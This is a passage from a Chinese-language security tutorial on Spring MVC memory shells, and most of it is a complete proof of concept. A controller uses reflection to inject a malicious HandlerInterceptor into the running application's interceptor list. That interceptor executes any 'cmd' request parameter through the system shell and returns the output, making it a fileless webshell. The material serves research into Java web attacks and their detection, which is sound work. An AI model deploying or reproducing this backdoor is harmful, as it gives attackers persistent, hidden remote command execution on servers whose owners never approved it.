ArrayList<Object> adtedinterceptors =(ArrayList<Object>)field.get(handlerMapping);
```

### 1x03 完整 POC 
```java
import com.stoocea.Interceptor.TestInterceptor;
import org.junit.Test;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.context.ContextLoader;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.servlet.handler.AbstractHandlerMapping;

import java.lang.reflect.Field;
import java.util.ArrayList;


//这里是测试interceptor类型memshell的POC，恶意interceptor在interceptor包中
@Controller
public class Evil2Controller {


    @GetMapping("/evil2")
    @ResponseBody
    public String getEvilInterceptor() throws Exception{

        //通过LiveBeansView获取顶级Context
//        Field field=Class.forName("org.springframework.context.support.LiveBeansView").getDeclaredField("applicationContexts");
//        field.setAccessible(true);
//        WebApplicationContext applicationContext=(org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet)field.get(null)).iterator().next();

        //通过ContextLoader.getCurrentWebApplicationContext() 来获取上下文
        WebApplicationContext applicationContext = ContextLoader.getCurrentWebApplicationContext();


        //通过IOC容器get到AbstractHandlerMapping
        AbstractHandlerMapping handlerMapping=applicationContext.getBean("requestMappingHandlerMapping", AbstractHandlerMapping.class);
        Field field1=AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
        field1.setAccessible(true);
        ArrayList<Object> adtedinterceptors =(ArrayList<Object>)field1.get(handlerMapping);
        TestInterceptor evilInterceptor=new TestInterceptor();
        adtedinterceptors.add(evilInterceptor);
        return "inject sucessfully";
    }
    
}
```

然后是恶意 interceptor 的内容
```java
package com.stoocea.Interceptor;

import org.springframework.web.servlet.HandlerInterceptor;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.InputStream;
import java.io.PrintWriter;
import java.util.Scanner;

public class TestInterceptor  implements HandlerInterceptor {

    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        String url = request.getRequestURI();
        PrintWriter writer = response.getWriter();

        if (request.getParameter("cmd") != null) {
            boolean isLinux = true;
            String osTyp = System.getProperty("os.name");
            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                isLinux = false;
            }
            String[] cmds = isLinux ? new String[]{"sh", "-c", request.getParameter("cmd")} : new String[]{"cmd.exe", "/c", request.getParameter("cmd")};
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner s = new Scanner(in).useDelimiter("\\A");
            String output = s.hasNext() ? s.next() : "";
            response.getWriter().write(output);
            response.getWriter().flush();
        }
        return true;

    }
}

```
测试其他 4 种方式也是成功的
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1709795113399-15ade1c7-1cb8-4be1-92b6-5f546d1c11cb.png#averageHue=%23dedddc&clientId=u8df47c52-911f-4&from=paste&height=513&id=uac6a0b89&originHeight=846&originWidth=2534&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=207982&status=done&style=none&taskId=u0eab628a-7133-4c47-9a84-8408883dbb5&title=&width=1535.7574869931836)



